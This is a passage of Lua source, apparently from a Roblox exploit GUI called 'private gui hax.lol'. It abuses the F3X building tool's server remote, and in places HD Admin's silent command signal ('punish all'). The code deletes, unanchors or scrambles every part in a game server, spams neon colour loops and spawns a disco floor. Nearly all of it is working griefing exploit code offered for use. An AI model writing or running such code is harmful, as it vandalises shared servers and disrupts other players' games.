+		local function ohno(args)
+			task.spawn(function()
+				pcall(function()
+					serverendpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function setanchor(part, boolean)
+			ohno({"SyncAnchor", {{["Part"] = part, ["Anchored"] = boolean}}})
+		end
+	
+		local function unanchorall()
+			local anti = {}
+			for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
+				local character = plr.Character
+				if character then
+					for _, part in ipairs(character:GetDescendants()) do
+						if part:IsA("BasePart") or part:IsA("UnionOperation") then
+							anti[part] = true
+						end
+					end
+				end
+			end
+	
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if (v:IsA("BasePart") or v:IsA("UnionOperation")) and v.Name ~= "kys" and not anti[v] then
+					setanchor(v, false)
+				end
+			end
+		end
+	
+		unanchorall()
+	end)
+end;
+task.spawn(C_61);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_63()
+local script = G2L["63"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local backpack = player.Backpack
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+		end
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		function _(args)
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function addlight(part, brightness)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "PointLight"
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function synclight(part, brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "PointLight",
+						["Range"] = 60,
+						["Color"] = Color3.new(1, 0, 0)
+					}
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function fire(part) 
+	
+			local argsCreate = {
+				[1] = "CreateDecorations",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire"
+					}
+				}
+			}
+	
+	
+			local argsSync = {
+				[1] = "SyncDecorate",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["DecorationType"] = "Fire",
+						["Size"] = 30,
+						["Heat"] = 9,
+						["Color"] = Color3.fromRGB(255, 0, 0), 
+						["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
+					} 
+				} 
+			}
+	
+	
+			_(argsCreate)
+			_(argsSync)
+		end
+		function MovePart(part, cf)
+			local args = {
+				"SyncMove",
+				{
+					{
+						Part = part,
+						CFrame = cf
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function resize(part, size, cf)
+			local args = {
+				"SyncResize",
+				{
+					{
+						Part = part,
+						CFrame = cf,
+						Size = size
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function mat(part, mate)
+			local args = {
+				"SyncMaterial",
+				{
+					{
+						Part = part,
+						Material = mate
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function transparency(part, trans)
+			local args = {
+				"SyncMaterial",
+				{
+					{
+						Part = part,
+						Transparency = trans
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function color(part, color)
+			local args = {
+				"SyncColor",
+				{
+					{
+						Part = part,
+						Color = color,
+						UnionColoring = false
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function syncmeshid(part, id)
+			local args = {
+				"SyncMesh",
+				{
+					{
+						Part = part,
+						MeshId = "rbxassetid://" .. id
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function makemesh(part)
+			local args = {
+				"CreateMeshes",
+				{
+					{
+						Part = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function syncmeshsize(part, vectora)
+			local args = {
+				"SyncMesh",
+				{
+					{
+						Part = part,
+						Scale = vectora
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function syncmeshtexture(part, id)
+			local args = {
+				"SyncMesh",
+				{
+					{
+						Part = part,
+						TextureId = "rbxassetid://" .. id
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function name(part, stringa)
+			local args = {
+				"SetName",
+				{ part },
+				stringa
+			}
+			_(args)
+		end
+	
+		local function lock(part, boolean)
+			local args = {
+				"SetLocked",
+				{ part },
+				boolean
+			}
+			_(args)
+		end
+	
+	
+	
+		local function setcollision(part, booleana)
+			local args = {
+				"SyncCollision",
+				{
+					{
+						Part = part,
+						CanCollide = booleana
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function setanchor(part, boolean)
+			local args = {
+				"SyncAnchor",
+				{
+					{
+						Part = part,
+						Anchored = boolean
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function createdecal(part, side)
+			local args = {
+				"CreateTextures",
+				{
+					{
+						Part = part,
+						Face = side,
+						TextureType = "Decal"
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function setdecal(part, asset, side)
+			local args = {
+				"SyncTexture",
+				{
+					{
+						Part = part,
+						Face = side,
+						TextureType = "Decal",
+						Texture = "rbxassetid://" .. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function toptexturecreate(part)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = Enum.NormalId.Top,
+						["TextureType"] = "Texture"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function toptextureadd(part)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = Enum.NormalId.Top,
+						["TextureType"] = "Texture",
+						["Texture"] = "rbxassetid://18878365966",
+						["StudsPerTileV"] = 4,
+						["StudsPerTileU"] = 4
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local position = CFrame.new(0, -10, 0)
+		local base = serverendpoint:InvokeServer("CreatePart", "Normal", position, workspace)
+		resize(base, Vector3.new(1000, 1, 1000), position)
+		toptexturecreate(base)
+		toptextureadd(base)
+	end)
+end;
+task.spawn(C_63);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_65()
+local script = G2L["65"];
+	script.Parent.MouseButton1Click:Connect(function()
+		-- brooo flashing hack
+		
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color,
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SetMaterial(part,material)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Material"] = material
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local colorbyelv4 = {
+			Color3.fromRGB(255,0,0),
+			Color3.fromRGB(255,128,0),
+			Color3.fromRGB(255,255,0),
+			Color3.fromRGB(0,255,0),
+			Color3.fromRGB(0,255,255),
+			Color3.fromRGB(0,128,255),
+			Color3.fromRGB(170,0,255),
+			Color3.fromRGB(255,0,170)
+		}
+	
+		local parts = workspace:GetDescendants()
+	
+		for _,v in ipairs(parts) do
+			if v:IsA("BasePart") then
+				if string.find(v.Name:lower(),"kys") then
+					print("ok")
+				else
+					task.defer(function()
+						SetMaterial(v,Enum.Material.Neon)
+						while true do
+							Color(v,colorbyelv4[math.random(1,#colorbyelv4)])
+							task.wait()
+						end
+					end)
+				end
+			end
+		end
+	end)
+end;
+task.spawn(C_65);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_67()
+local script = G2L["67"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		local Players = game:GetService("Players")
+		local ws = game:GetService("Workspace")
+	
+		local player = Players.LocalPlayer
+	
+		local function getf3x()
+			local char = player.Character
+			local backpack = player.Backpack
+	
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+			return
+		end
+	
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		local function delete(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local mesh = ws:FindFirstChild("kys")
+	
+		local function deleteall()
+			for _, v in ipairs(ws:GetDescendants()) do
+				if v:IsA("BasePart") or v:IsA("UnionOperation") then
+					local isPlayerPart = false
+					for _, p in ipairs(Players:GetPlayers()) do
+						if p.Character and v:IsDescendantOf(p.Character) then
+							isPlayerPart = true
+							break
+						end
+					end
+					if v ~= mesh and not isPlayerPart then
+						task.spawn(function()
+							delete(v)
+						end)
+					end
+				end
+			end
+		end
+	
+		deleteall()
+	
+		function _(args)
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function resize(part, size, cf)
+			local args = {
+				"SyncResize",
+				{
+					{
+						Part = part,
+						CFrame = cf,
+						Size = size
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function toptexturecreate(part)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = Enum.NormalId.Top,
+						["TextureType"] = "Texture"
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function toptextureadd(part)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = Enum.NormalId.Top,
+						["TextureType"] = "Texture",
+						["Texture"] = "rbxassetid://13199422086",
+						["StudsPerTileV"] = 2,
+						["StudsPerTileU"] = 2
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function color(part, col)
+			local args = {
+				"SyncColor",
+				{
+					{
+						Part = part,
+						Color = col,
+						UnionColoring = false
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function setanchor(part, boolean)
+			local args = {
+				"SyncAnchor",
+				{
+					{
+						Part = part,
+						Anchored = boolean
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local function lock(part, boolean)
+			local args = {
+				"SetLocked",
+				{ part },
+				boolean
+			}
+			_(args)
+		end
+	
+		local function RealmV2()
+			local pos = CFrame.new(0, -5, 0)
+			local base = serverendpoint:InvokeServer("CreatePart", "Normal", pos, ws)
+			resize(base, Vector3.new(1000, 1, 1000), pos)
+			toptexturecreate(base)
+			toptextureadd(base)
+			color(base, Color3.fromRGB(0, 150, 0))
+			setanchor(base, true)
+			lock(base, true)
+		end
+	
+		RealmV2()
+	end)
+end;
+task.spawn(C_67);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_69()
+local script = G2L["69"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+		local Players = game:GetService("Players")
+		local ws = game:GetService("Workspace")
+	
+		local player = Players.LocalPlayer
+	
+		local function getf3x()
+			local char = player.Character
+			local backpack = player.Backpack
+	
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			return nil
+		end
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+			return
+		end
+	
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		function calling(args)
+			task.spawn(function()
+				pcall(function()
+					serverendpoint:InvokeServer(unpack(args))
+				end)
+			end)
+		end
+	
+		local function resize(part, size, cf)
+			local args = {
+				"SyncResize",
+				{
+					{
+						Part = part,
+						CFrame = cf,
+						Size = size
+					}
+				}
+			}
+			calling(args)
+		end
+	
+		function toptexturecreate(part)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = Enum.NormalId.Top,
+						["TextureType"] = "Texture"
+					}
+				}
+			}
+			calling(args)
+		end
+	
+		function toptextureadd(part)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = Enum.NormalId.Top,
+						["TextureType"] = "Texture",
+						["Texture"] = "rbxassetid://13199422086",
+						["StudsPerTileV"] = 2,
+						["StudsPerTileU"] = 2
+					}
+				}
+			}
+			calling(args)
+		end
+	
+		local function color(part, col)
+			local args = {
+				"SyncColor",
+				{
+					{
+						Part = part,
+						Color = col,
+						UnionColoring = false
+					}
+				}
+			}
+			calling(args)
+		end
+	
+		local function setanchor(part, boolean)
+			local args = {
+				"SyncAnchor",
+				{
+					{
+						Part = part,
+						Anchored = boolean
+					}
+				}
+			}
+			calling(args)
+		end
+	
+		local function lock(part, boolean)
+			local args = {
+				"SetLocked",
+				{ part },
+				boolean
+			}
+			calling(args)
+		end
+	
+		local function delete(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			calling(args)
+		end
+	
+		local mesh = ws:FindFirstChild("kys")
+	
+		task.spawn(function()
+			local pos = CFrame.new(0, -5, 0)
+			local base = serverendpoint:InvokeServer("CreatePart", "Normal", pos, ws)
+			task.spawn(function() resize(base, Vector3.new(1000, 1, 1000), pos) end)
+			task.spawn(function() toptexturecreate(base) end)
+			task.spawn(function() toptextureadd(base) end)
+			task.spawn(function() color(base, Color3.fromRGB(0, 150, 0)) end)
+			task.spawn(function() setanchor(base, true) end)
+			task.spawn(function() lock(base, true) end)
+	
+			task.wait(0.3)
+	
+			for _, v in ipairs(ws:GetDescendants()) do
+				if v:IsA("BasePart") or v:IsA("UnionOperation") then
+					local isPlayerPart = false
+					for _, p in ipairs(Players:GetPlayers()) do
+						if p.Character and v:IsDescendantOf(p.Character) then
+							isPlayerPart = true
+							break
+						end
+					end
+					if v ~= mesh and v ~= base and not isPlayerPart then
+						task.spawn(function()
+							delete(v)
+						end)
+					end
+				end
+			end
+		end)
+	end)
+end;
+task.spawn(C_69);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_6b()
+local script = G2L["6b"];
+	script.Parent.MouseButton1Click:Connect(function()
+				local Players = game:GetService("Players")
+				local player = Players.LocalPlayer
+				local char = player.Character or player.CharacterAdded:Wait()
+				local hrp = char:WaitForChild("HumanoidRootPart")
+	
+				local tool
+				for i,v in player:GetDescendants() do
+					if v.Name == "SyncAPI" then
+						tool = v.Parent
+					end
+				end
+	
+				for i,v in game.ReplicatedStorage:GetDescendants() do
+					if v.Name == "SyncAPI" then
+						tool = v.Parent
+					end
+				end
+	
+				remote = tool.SyncAPI.ServerEndpoint
+	
+				local function ohno(args)
+					task.defer(function()
+						pcall(function()
+							remote:InvokeServer(unpack(args))
+						end)
+					end)
+				end
+	
+				function SetCollision(part,boolean)
+					local args = {
+						[1] = "SyncCollision",
+						[2] = {
+							[1] = {
+								Part = part,
+								CanCollide = boolean
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetAnchor(boolean,part)
+					local args = {
+						[1] = "SyncAnchor",
+						[2] = {
+							[1] = {
+								Part = part,
+								Anchored = boolean
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function CreatePart(cf,parent)
+					local args = {
+						[1] = "CreatePart",
+						[2] = "Normal",
+						[3] = cf,
+						[4] = parent
+					}
+					ohno(args)
+				end
+	
+				function DestroyPart(part)
+					local args = {
+						[1] = "Remove",
+						[2] = {
+							[1] = part
+						}
+					}
+					ohno(args)
+				end
+	
+				function MovePart(part,cf)
+					local args = {
+						[1] = "SyncMove",
+						[2] = {
+							[1] = {
+								Part = part,
+								CFrame = cf
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function Resize(part,size,cf)
+					local args = {
+						[1] = "SyncResize",
+						[2] = {
+							[1] = {
+								Part = part,
+								CFrame = cf,
+								Size = size
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function AddMesh(part)
+					local args = {
+						[1] = "CreateMeshes",
+						[2] = {
+							[1] = {
+								Part = part
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetMesh(part,meshid)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								MeshId = "rbxassetid://"..meshid
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetTexture(part,texid)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								TextureId = "rbxassetid://"..texid
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SetName(part,stringg)
+					local args = {
+						[1] = "SetName",
+						[2] = {
+							[1] = part
+						},
+						[3] = stringg
+					}
+					ohno(args)
+				end
+	
+				function MakeMeshNeon(part)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								VertexColor = vector.create(3,3,3)
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function MeshResize(part,size)
+					local args = {
+						[1] = "SyncMesh",
+						[2] = {
+							[1] = {
+								Part = part,
+								Scale = size
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function Weld(part1,part2,lead)
+					local args = {
+						[1] = "CreateWelds",
+						[2] = {
+							[1] = part1,
+							[2] = part2
+						},
+						[3] = lead
+					}
+					ohno(args)
+				end
+	
+				function SetLocked(part,boolean)
+					local args = {
+						[1] = "SetLocked",
+						[2] = {
+							[1] = part
+						},
+						[3] = boolean
+					}
+					ohno(args)
+				end
+	
+				function SetTrans(part,int)
+					local args = {
+						[1] = "SyncMaterial",
+						[2] = {
+							[1] = {
+								Part = part,
+								Transparency = int
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function CreateSpotlight(part)
+					local args = {
+						[1] = "CreateLights",
+						[2] = {
+							[1] = {
+								Part = part,
+								LightType = "SpotLight"
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SyncLighting(part,brightness)
+					local args = {
+						[1] = "SyncLighting",
+						[2] = {
+							[1] = {
+								Part = part,
+								LightType = "SpotLight",
+								Brightness = brightness
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function Color(part,color)
+					local args = {
+						[1] = "SyncColor",
+						[2] = {
+							[1] = {
+								Part = part,
+								Color = color,
+								UnionColoring = false
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function SpawnDecal(part,side)
+					local args = {
+						[1] = "CreateTextures",
+						[2] = {
+							[1] = {
+								Part = part,
+								Face = side,
+								TextureType = "Decal"
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				function AddDecal(part,asset,side)
+					local args = {
+						[1] = "SyncTexture",
+						[2] = {
+							[1] = {
+								Part = part,
+								Face = side,
+								TextureType = "Decal",
+								Texture = "rbxassetid://"..asset
+							}
+						}
+					}
+					ohno(args)
+				end
+	
+				local floorCF = CFrame.new(hrp.Position - Vector3.new(0,0.75,0))
+	
+				CreatePart(floorCF,workspace)
+	
+				task.wait(0.3)
+	
+				local part
+				for _,v in pairs(workspace:GetChildren()) do
+					if v:IsA("Part") then
+						part = v
+					end
+				end
+	
+				if part then
+					SetName(part,"discohack")
+					Resize(part,Vector3.new(2048,0.05,2048),floorCF)
+					SetCollision(part,false)
+					SetAnchor(true,part)
+	
+					remote:InvokeServer("SyncMaterial",{
+						{
+							Part = part,
+							Material = Enum.Material.ForceField
+						}
+					})
+	
+					local discocolor = {
+						Color3.new(255/255,0/255,0/255),
+						Color3.new(255/255,85/255,0/255),
+						Color3.new(218/255,218/255,0/255),
+						Color3.new(0/255,190/255,0/255),
+						Color3.new(0/255,85/255,255/255),
+						Color3.new(0/255,0/255,127/255),
+						Color3.new(170/255,0/255,255/255),
+						Color3.new(0/255,204/255,204/255),
+						Color3.new(255/255,85/255,127/255),
+						Color3.new(0/255,0/255,0/255),
+						Color3.new(255/255,255/255,255/255)
+					}
+	
+					while true do
+						for _,c in ipairs(discocolor) do
+							Color(part,c)
+							task.wait(0.5)
+						end
+					end
+				end
+	end)
+end;
+task.spawn(C_6b);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_6d()
+local script = G2L["6d"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local function findBuildingTools()
+			local player = game:GetService("Players").LocalPlayer
+	
+			for _, item in ipairs(player.Character:GetChildren()) do
+				if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
+					return item
+				end
+			end
+	
+			for _, item in ipairs(player.Backpack:GetChildren()) do
+				if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
+					return item
+				end
+			end
+	
+			return nil
+		end
+	
+		local buildingTools = findBuildingTools()
+		if not buildingTools then
+			warn("btools not found")
+			return
+		end
+	
+		local syncAPI        = buildingTools:FindFirstChild("SyncAPI")
+		local serverEndpoint = syncAPI and syncAPI:FindFirstChild("ServerEndpoint")
+	
+		if not serverEndpoint then
+			warn("btools not found")
+			return
+		end
+	
+		local discohack = workspace:FindFirstChild("discohack")
+		if not discohack then
+			print"meh"
+		end
+	
+		local args = {
+			"Remove",                
+			{ discohack }           
+		}
+	
+		local success, result
+		if serverEndpoint:IsA("RemoteFunction") then
+			success, result = pcall(function()
+				return serverEndpoint:InvokeServer(unpack(args))
+			end)
+		else
+	
+			serverEndpoint:FireServer(unpack(args))
+			success = true
+		end
+	
+		if success then
+	
+			print"yippie"
+	
+		end
+	end)
+end;
+task.spawn(C_6d);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_6f()
+local script = G2L["6f"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color,
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+	
+		local Skyonlyyk = game.Workspace:FindFirstChild("kys")
+	
+		function randomise()
+			for i,v in game.Workspace:GetDescendants() do
+				if v:IsA("BasePart") and v ~= Skyonlyyk then
+					spawn(function()
+						SetLocked(v,false)
+						MovePart(v,v.CFrame * CFrame.Angles(math.random(0,1), math.random(0,1), math.random(0,1)))
+					end)
+				end
+			end
+		end
+		randomise()
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	end)
+end;
+task.spawn(C_6f);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_71()
+local script = G2L["71"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local Players = game:GetService("Players")
+		local player = Players.LocalPlayer
+	
+		local character = player.Character 
+	
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";punish all")
+	
+		local backpack = player.Backpack
+	
+		local function getf3x()
+			for _, v in ipairs(backpack:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+			for _, v in ipairs(char:GetChildren()) do
+				if v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			return nil
+		end
+	
+		-- get all info
+	
+		local f3x = getf3x()
+		if not f3x then
+			warn("you dont have f3x skid")
+		end
+		local syncapi = f3x.SyncAPI
+		local serverendpoint = syncapi.ServerEndpoint
+	
+		local function delete(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			serverendpoint:InvokeServer(unpack(args))
+		end
+	
+		local function deleteall()
+			for _, v in ipairs(workspace:GetDescendants()) do
+				if (v:IsA("BasePart") or v:IsA("UnionOperation")) and v.Name ~= "kys" then
+					spawn(function()
+						delete(v)
+					end)
+				end
+			end
+		end
+	
+		deleteall()
+	end)
+end;
+task.spawn(C_71);
+-- StarterGui.private gui hax.lol.F3XtabPage.ScrollFrame.Button.LocalScript
+function C_73()
+local script = G2L["73"];
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";time 0 ;fogcolor black ;unfog")
+	
+		local Players = game:GetService("Players")
+		local Workspace = game:GetService("Workspace")
+		local player = Players.LocalPlayer
+	
+		local function findTool()
+			local char = player.Character or player.CharacterAdded:Wait()
+	
+			for _, v in ipairs(char:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+	
+			for _, v in ipairs(player.Backpack:GetChildren()) do
+				if v:IsA("Tool") and v:FindFirstChild("SyncAPI") then
+					return v
+				end
+			end
+		end
+	
+		local tool = findTool()
+		if not tool then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+		local function call(a)
+			return remote:InvokeServer(unpack(a))
+		end
+	
+		local hack = Workspace:FindFirstChild("kys")
+		if hack then
+			call({ "Remove", { hack } })
+		end
+	
+		local char = player.Character or player.CharacterAdded:Wait()
